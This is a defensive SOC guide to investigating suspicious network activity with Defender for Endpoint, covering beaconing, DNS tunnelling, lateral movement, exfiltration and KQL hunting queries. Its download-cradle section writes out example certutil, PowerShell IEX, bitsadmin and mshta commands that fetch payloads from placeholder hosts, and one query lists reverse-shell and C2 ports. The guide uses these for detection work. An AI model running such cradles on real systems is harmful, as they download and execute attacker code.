# Suspicious network activity — investigation

## What you're looking for

Malware needs to phone home, download tools, reach other devices or send data out. All of that leaves network traces. The key question for every connection: is this process supposed to make this call, to this destination, in this way? Decide on the process and the destination. A pattern alone doesn't make traffic malicious, and a familiar destination doesn't make it benign.

What to do, in order, is in the [playbook](playbook.md). This page explains what you are looking at and how to scope it.

T0 = the first suspicious network event from the device, or the earliest malicious event before it, in UTC. It is not the alert time. Advanced Hunting holds 30 days of native data; older activity needs Sentinel retention.

| What you see | Read |
|--------------|------|
| Repeated connections to one external destination, often on a timer | [C2 beaconing signals](#c2-beaconing-signals), then the [C2 beaconing investigation](../08-c2-beaconing/investigation.md) |
| A downloader or script host fetching from the internet | [Download cradles](#download-cradles) |
| DNS names with long, changing labels under one domain | [DNS beaconing](#dns-beaconing) |
| A script host or unknown program reaching a cloud, paste or webhook service | [LOTS](#lots--living-off-trusted-sites), then the [LOTS & cloud C2 investigation](../09-lots-cloud-c2/investigation.md) |
| One device connecting to other internal devices on admin ports | [Lateral movement — network signals](#lateral-movement--network-signals) |
| Outbound connections on an unusual port, or from `cmd.exe` or `powershell.exe` | [Unusual ports and reverse shells](#unusual-ports-and-reverse-shells) |
| Possible data theft | [Data leaving the device](#data-leaving-the-device) |

---

## What MDE can and can't show you

| You want | In MDE? |
|----------|---------|
| Connection time, remote IP, port, URL or host name | Yes: `DeviceNetworkEvents` (`Timestamp`, `RemoteIP`, `RemotePort`, `RemoteUrl`, `RemoteIPType`) |
| Which process made the connection | Yes: `InitiatingProcessFileName`, `InitiatingProcessFolderPath`, `InitiatingProcessSHA1`, `InitiatingProcessCommandLine`, `InitiatingProcessId`, `InitiatingProcessCreationTime`, `InitiatingProcessParentFileName`, `InitiatingProcessAccountName`. `InitiatingProcessSHA256` is usually empty; use SHA1 |
| Whether that process is signed | Look up its SHA1 in `DeviceFileCertificateInfo` (`Signer`, `IsTrusted`). The `VersionInfo` columns are version metadata from the file itself; they don't show a signature |
| Whether the process ran in a remote desktop session | `IsInitiatingProcessRemoteSession` (RDP session or local) and `InitiatingProcessRemoteSessionIP` |
| Whether a connection was blocked | Not from `DeviceNetworkEvents`. Network protection blocks appear in `DeviceEvents` as `ExploitGuardNetworkProtectionBlocked` (audit only: `ExploitGuardNetworkProtectionAudited`) and in the alerts queue. Microsoft states a blocked site can still show `ConnectionSuccess` in network events, because those are reported from the TCP layer |
| Whether a connection is open now | Not from the logs. Use Live Response `connections` ("Shows all the active connections") or the investigation package's Network connections folder (`ActiveNetConnections.txt`) |
| Bytes sent or received | No. `DeviceNetworkEvents` has no byte-count column. Needs proxy or firewall logs |
| HTTP user agent | No column for it. Needs proxy logs |
| Full URL path of an HTTPS connection | Don't rely on it. For HTTPS, expect `RemoteUrl` to hold a host name at most (VERIFY (tenant)). The command line of the process often holds the full URL |
| DNS query names | No documented column. Microsoft describes a `DnsConnectionInspected` `ActionType` in `DeviceNetworkEvents` with the query in `AdditionalFields` (VERIFY (tenant)). The investigation package's `DnsCache.txt` shows the DNS resolver cache at collection time |

---

## C2 beaconing signals

Full detail, with the beaconing queries and their limits → [../08-c2-beaconing/investigation.md](../08-c2-beaconing/investigation.md). A timer-driven pattern shows that some software calls out on a schedule. It doesn't show that the software is malicious: decide that on the process and the destination.

| Signal | What it tells you | Limits |
|--------|-------------------|--------|
| Many connections to one destination | A short timer. A 60-second sleep gives about 1,440 connections a day | Browsers and SaaS apps also hit the same CDN or service IPs thousands of times. A slow beacon stays under any count threshold. C2 spread over several IPs splits the count |
| Regular gaps between connections | Timer-driven software | Defender and other agents, Teams, Windows Time, CRL/OCSP checks and RMM agents are timer-driven too. Regular doesn't mean malicious |
| Uniform byte sizes | A fixed heartbeat | Not in MDE; needs proxy or firewall logs |
| Connections at night | Nobody is driving the traffic | Weak. Servers and devices left on overnight make night traffic legitimately; a beacon on a laptop stops while the laptop sleeps |
| Unexpected initiating process | The strongest signal | Check the folder path, SHA1 and signer, not the name: a fake `svchost.exe` in `AppData` has the same file name as the real one. A beacon can also run inside a signed program (injection or DLL side-loading) |

**Cobalt Strike defaults:** sleep 60 seconds, jitter 0%, user agent "Internet Explorer (Random)" (see [Cobalt Strike defaults](../08-c2-beaconing/investigation.md#cobalt-strike-defaults)). Operators usually change them, MDE doesn't record user agents, and other C2 frameworks have their own defaults. A match is supporting evidence, not proof. Don't clear an alert because the values don't match.

---

## Download cradles

```
certutil.exe -urlcache -split -f "http://185.x.x.x/payload.exe" C:\Users\Public\update.exe
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
bitsadmin.exe /transfer job1 http://malicious.com/p.exe C:\Temp\p.exe
mshta.exe http://185.x.x.x/payload.hta
```

Also `curl.exe` ("Every installation of Microsoft Windows 10 and Windows 11 has curl installed by default"), PowerShell `Invoke-WebRequest` and `Start-BitsTransfer`, and `finger`. ATT&CK T1105 names `copy`, `finger`, `certutil` and the PowerShell `IEX(New-Object Net.WebClient).downloadString()` and `Invoke-WebRequest` patterns among Windows download methods.

- **Read the command line first.** It holds the full URL (even for HTTPS) and the output path. A PowerShell `-EncodedCommand` (`-e`, `-ec`) is Base64 of UTF-16LE text: decode it as text, never run it ([decode before you judge](../02-suspicious-process/investigation.md#decode-before-you-judge)).
- **Find the network event.** `certutil.exe`, PowerShell, `curl.exe` and `mshta.exe` make the connection themselves: look for network events with the same `InitiatingProcessId` and `InitiatingProcessCreationTime`. BITS transfers are run by the BITS service, which runs inside `svchost.exe` (ATT&CK T1197 describes BITS notify commands launched "from svchost.exe -k netsvcs -s BITS"). Expect the network event for a `bitsadmin.exe` or `Start-BitsTransfer` download to name `svchost.exe` (VERIFY (tenant)); match it on the host and time from the command line. A signed `svchost.exe` in `System32` doesn't clear a BITS download.
- **Find what it wrote and whether it ran.** In `DeviceFileEvents`, look for files written by the downloader (same `InitiatingProcessId` and `InitiatingProcessCreationTime`) and files whose `FileOriginUrl` contains the host. Record the path and SHA1 of each. Run the hash sweep in the [malware alert investigation](../01-malware-alert/investigation.md#step-4--check-for-spread) and read `Tables`. A downloader often exits within seconds, so "not running" isn't "not executed".
- **Was it blocked?** Check the alert's detection status and ASR events ([was it blocked?](../02-suspicious-process/investigation.md#was-it-blocked)) and the network protection events in the table above. A block doesn't clear the device: the downloader still ran.
- **Don't touch the URL.** Don't browse to it, download from it or submit it to a public URL scanner ([LOTS Step 3](../09-lots-cloud-c2/investigation.md#step-3--recover-the-full-url)). Record it as an IOC.
- Suspicious destinations: raw IPs, paste sites, newly registered domains. A familiar or cloud destination doesn't clear a download: see [LOTS](#lots--living-off-trusted-sites).

---

## DNS beaconing

```
11:00:00  6d7367313a6f6b.c2.example.net
11:01:01  2f62696e2f7368.c2.example.net
```

Long, random-looking labels that change on every query under one parent domain = likely DNS tunnelling or C2. Tunnels usually encode data as hex or base32 rather than base64: DNS names are case-insensitive (RFC 1035: resolvers "must compare labels in a case-insensitive manner"), and base64 needs both cases. dnscat2, for example, states: "All data in both directions is transported in hex-encoded strings." Don't dismiss a label because it doesn't look like base64.

- **Count unique labels per parent domain** (`c2.example.net` above), not per full name. Every query in a tunnel has a different full name, so a count per name is always 1.
- **DNS beacons can be slow.** ATT&CK T1071.004: "DNS beacons may be difficult to detect because the beacons infrequently communicate with infected devices."
- **Where to see query names:** `DnsConnectionInspected` events, if your tenant has them (see the table above); the investigation package's `DnsCache.txt` (names the device resolved recently); and the customer's DNS server or resolver logs, if they keep them.
- **Don't rely on [dns-tunnelling.kql](../../../kql/network/dns-tunnelling.kql).** It groups by the full name, so its unique-label count is always 1, and it looks back 24 hours from when you run it, not from T0. Zero rows from it don't clear a device.
- **DNS over HTTPS.** ATT&CK T1572: "queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets." Those lookups never appear as DNS; you see only HTTPS connections to the resolver.
- A DNS tunnelling pattern is a playbook escalation trigger. The parent domain is the IOC.

---

## LOTS — Living Off Trusted Sites

Malware using legitimate cloud services for C2, payloads or exfiltration: OneDrive and SharePoint, Microsoft Graph, GitHub, Discord, Telegram, paste sites, Google Drive, Dropbox, object storage. Full detail → [../09-lots-cloud-c2/investigation.md](../09-lots-cloud-c2/investigation.md)

Classify the connecting process with the four client classes in [LOTS Step 1](../09-lots-cloud-c2/investigation.md#step-1--identify-the-client): A browser, B sync or collaboration client, C scripting engine or downloader, D anything else. Scripting engines are only one class. Class D covers unsigned programs, a known name in an unusual folder, a signed program that loaded a DLL from its own or a user-writable folder, and a non-Microsoft process calling Microsoft Graph. A trusted domain, a valid certificate and port 443 tell you nothing here.

---

## Lateral movement — network signals

A connection to an internal host shows that the device tried to reach it. It doesn't show a logon or remote execution: confirm those on the target.

| Port | Used by | Many internal targets from one device can mean |
|------|---------|-----------------------------------------------|
| 445 | SMB | SMB scanning, share enumeration, PsExec-style remote services, or SMB-based C2 |
| 139 | NetBIOS session (older SMB) | As for 445, on older systems |
| 135 | RPC endpoint mapper | WMI and other RPC-based remote management |
| 3389 | RDP | RDP scanning or movement |
| 5985 / 5986 | WinRM over HTTP / HTTPS (default ports since WinRM 2.0; listeners can use any port) | PowerShell remoting |
| 22 | SSH | SSH scanning or movement |

Normal sources of these connections: file servers, domain controllers, print servers, management and deployment tools, and approved vulnerability scanners. A workstation reaching internal hosts beyond its usual file servers, print servers and domain controllers needs an explanation. There is no safe count threshold.

**Scanning or movement?**
- **Scanning:** one device, many internal targets, a short time, mostly failed connections. The [lateral movement query](#internal-lateral-movement-scanning) has no `ActionType` filter, so it counts every event type together. In your copy, add `ActionType` to the `by` line to see successes and failures separately.
- **Movement:** a logon or remote execution on a target. For each target that accepted a connection, check its logons (`DeviceLogonEvents`) and remote execution (PsExec services, `WmiPrvSE.exe` children, `wsmprovhost.exe`) with [remote execution tools](../06-credential-compromise/investigation.md#remote-execution-tools) in the credential compromise investigation.
- **Scanning tools:** ATT&CK T1046 records Advanced IP Scanner and Advanced Port Scanner used to "enumerate network devices" in intrusions. Search `DeviceProcessEvents` on the device for scanner tools. An approved scanner is benign only when the customer confirms its source device and the scan window.
- **Which process?** Outbound SMB may be attributed to `System` rather than to the program that asked for it (VERIFY (tenant)). Find the program in the Device timeline around the same time.
- **Window.** The query covers T0 − 1h to T0 + 1h. Widen both `between` values in your copy if the activity lasted longer. Remove the device filter to find other devices doing the same.
- **Investigation package.** `Arp.txt` (the ARP cache, which can show other hosts the device talked to) and the SMB sessions files (inbound and outbound SMB sessions) help identify targets.

**Internal C2.** Cobalt Strike's SMB Beacon "uses named pipes to communicate through a parent Beacon", "also works across the network", and the host running it "must accept connections on port 445". Its TCP Beacon listens on a port (default 4444). Device-to-device C2 therefore looks like the connections above: repeated connections between the same two internal devices, or a process listening on an unusual port (Live Response `connections`). Check the target as well; each device in a chain runs a beacon. The C2 beaconing queries drop private destinations, so they don't see it.

---

## Unusual ports and reverse shells

- **Reverse shell:** `cmd.exe` or `powershell.exe` itself making an outbound connection. This is a playbook escalation trigger.
- **The ports in the [unusual outbound ports](#unusual-outbound-ports) query are leads, not proof.** The labels in its comments are the query author's. Two were checked against Fortra's Cobalt Strike documentation: 4444 is the TCP Beacon's default listen port. 50050 is labelled as the team server port, which is the operator's management port (Fortra: "Do not expose the management port directly to the public internet"), not where a Beacon checks in. The port number itself wasn't on the pages checked.
- **The query hides processes by file name only** (`chrome.exe`, `msedge.exe`, `firefox.exe`, `teams.exe`, `slack.exe`, `zoom.exe`). Malware with one of those names, or code injected into a browser, is hidden. Programs with other names aren't excluded at all. Check the folder and signer of any excluded process you rely on.
- Management software can use fixed non-standard ports. That is benign only for a named, sanctioned product (playbook, Closing as a false positive).

---

## Data leaving the device

MDE records no byte counts, so it can't show a "large outbound transfer". Volume needs the customer's proxy or firewall logs. What you can see:
- Upload and sync tools in command lines (`DeviceProcessEvents`), for example `rclone` or `MEGAsync`, started by an unexpected process or account.
- Files collected and compressed shortly before the connections (archives written in `DeviceFileEvents`).
- A scripting engine or unknown program (LOTS client class C or D) connecting to a webhook service, the Telegram Bot API, Microsoft Graph or a storage host outside the customer's tenant. Treat that as possible exfiltration, whatever the volume ([LOTS Step 7](../09-lots-cloud-c2/investigation.md#step-7--work-out-what-was-sent)).
- Connection counts show how often a process connected, not how much it sent.

---

## Scope

Spread is a reason to scope wider, never evidence that the traffic is benign.

- **Other devices talking to the destination.** Search the IP or domain in the Defender portal. IP page: "IP prevalence in the organization" (how many devices, first and last seen; default 30 days) and "IP activity observed in the organization" (up to 100 devices). URL/domain page: the Devices tab (first and last event per device; default 30 days, up to six months). The [high connection count](#high-connection-count) query also runs estate-wide, but only shows pairs above 30 connections.
- **The same process or downloaded file on other devices.** Run the hash sweep in the [malware alert investigation](../01-malware-alert/investigation.md#step-4--check-for-spread) with each SHA1. Zero rows doesn't prove no spread.
- **After a block.** A device in `ExploitGuardNetworkProtectionBlocked` events for the destination is still trying to reach it: it is in scope.
- **Internal targets.** Every internal host that accepted a connection from the device is in scope until checked ([lateral movement](#lateral-movement--network-signals)).
- **First contact.** Rerun the query that hit with `T0 - 24h` changed to `T0 - 30d` on its `between` line in your copy (the 30-day Advanced Hunting limit). The earliest row for the same process SHA1 or destination on this device is the T0 candidate. The URL/domain page's Devices tab goes back further.

---

## KQL queries

Every window is anchored to T0 (replace `PASTE_TIME_UTC`). These queries filter and threshold: zero rows doesn't clear a device.

### All external connections from a device
```kql
// 03 — all external connections from one device
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive
// TODO: byte volumes need proxy/firewall logs; DeviceNetworkEvents has no SentBytes/ReceivedBytes

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteIPType != "Private"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort,
    InitiatingProcessFileName
| order by Timestamp asc
```

It returns the process file name only. For the folder path, SHA1, command line and account the playbook asks for, use the Device timeline, or add `InitiatingProcessFolderPath`, `InitiatingProcessSHA1`, `InitiatingProcessCommandLine` and `InitiatingProcessAccountName` to the `project` line in your copy. `RemoteIPType != "Private"` keeps every other type (Public, Reserved, Loopback and others), not only public addresses.

### High connection count
```kql
// C2 beaconing detection — high connection count to single external destination
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1071.001
// Primary beacon signal: same device hitting same external IP 30+ times per day
// Sort by ConnectionCount desc and investigate anything above 30 to a non-CDN destination
// Counts ConnectionSuccess rows in the 24h before T0 (24h keeps the 30-per-day threshold meaningful)
// TODO: byte volumes need proxy/firewall logs; DeviceNetworkEvents has no byte-count columns
// Ref: docs/scenarios/08-c2-beaconing/investigation.md, docs/scenarios/03-suspicious-network-activity/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where Timestamp between ((T0 - 24h) .. T0)
| where ActionType == "ConnectionSuccess"
| where RemoteIPType != "Private"
| where RemoteIP != ""
| summarize
    ConnectionCount = count(),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp),
    Processes = make_set(InitiatingProcessFileName, 3)
    by DeviceName, RemoteIP, RemoteUrl, RemotePort
| where ConnectionCount > 30
| extend DurationHrs = round(
    datetime_diff('minute', LastSeen, FirstSeen) / 60.0, 1)
| order by ConnectionCount desc
```

Limits are in the [C2 beaconing investigation](../08-c2-beaconing/investigation.md#high-connection-count): C2 spread over several IPs splits the count, a slow beacon stays under 30, and `Processes` lists file names only. The comment's "non-CDN destination" is not a reason to skip a row: a CDN destination doesn't clear a connection (ATT&CK T1090.004, domain fronting, routes C2 through CDNs).

### Internal lateral movement scanning
```kql
// Internal lateral movement — network scanning detection
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1046
// Infected device probing internal IPs on admin/remote-access ports
// High TargetCount on any port = active scanning for spread opportunities
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive
// Remove the device filter to run estate-wide
// Ref: docs/scenarios/03-suspicious-network-activity/investigation.md, docs/scenarios/06-credential-compromise/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where RemoteIPType == "Private"
| where RemotePort in (445, 3389, 22, 135, 139, 5985, 5986)
| where Timestamp between ((T0 - 1h) .. (T0 + 1h))
| summarize
    TargetCount = dcount(RemoteIP),
    TargetIPs = make_set(RemoteIP, 10)
    by RemotePort, InitiatingProcessFileName
| order by TargetCount desc
```

Limits: no `ActionType` filter, a two-hour window, file names only, and `TargetIPs` lists at most 10 addresses. See [lateral movement](#lateral-movement--network-signals) for how to read it.

### Unusual outbound ports
```kql
// Network — outbound connections on non-standard C2 ports
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1571
// Covers commonly used C2 and reverse shell ports not typical in business traffic
// Excludes known legitimate uses where possible — tune the process exclusion list
// for your environment
// Ref: docs/scenarios/03-suspicious-network-activity/investigation.md, docs/scenarios/08-c2-beaconing/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceNetworkEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteIPType != "Private"
| where RemotePort in (
    4444,   // Metasploit default
    4445,   // Metasploit alternate
    1337,   // common C2 / reverse shell
    8080,   // alternate HTTP C2
    8443,   // alternate HTTPS C2
    8888,   // common C2
    9001,   // Tor / C2
    9090,   // common C2
    50050,  // Cobalt Strike team server default
    31337,  // classic backdoor port (Back Orifice)
    6666,   // IRC / C2
    6667,   // IRC C2
    1234,   // generic reverse shell
    2222,   // alternate SSH / C2
    5555,   // Android ADB / C2
    7777    // common C2
)
| where InitiatingProcessFileName !in~ (
    "chrome.exe", "msedge.exe", "firefox.exe",
    "teams.exe", "slack.exe", "zoom.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName,
    RemoteIP, RemotePort, RemoteUrl,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```

Limits: see [unusual ports and reverse shells](#unusual-ports-and-reverse-shells). It looks at non-private destinations only, so an internal TCP Beacon on 4444 isn't in it.

---

## False positives

These tests don't separate benign software from C2, so don't close on them:
- **A known app from a standard path.** Attackers install real remote-access tools. ATT&CK T1219: "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network." Beacons can also run inside signed programs.
- **A long-established vendor domain or a CDN.** C2 can run over cloud services and through CDNs.
- **The same pattern on many devices.** That can be spread. Scope it as a possible campaign.
- **A signed `svchost.exe` behind a download.** BITS downloads run there.
- **An internal scan from an address that looks like the scanner.** Confirm the scanner's source device and the scan window with the customer.

To close as a false positive, every condition in [Closing as a false positive](playbook.md#closing-as-a-false-positive) in the playbook must hold.
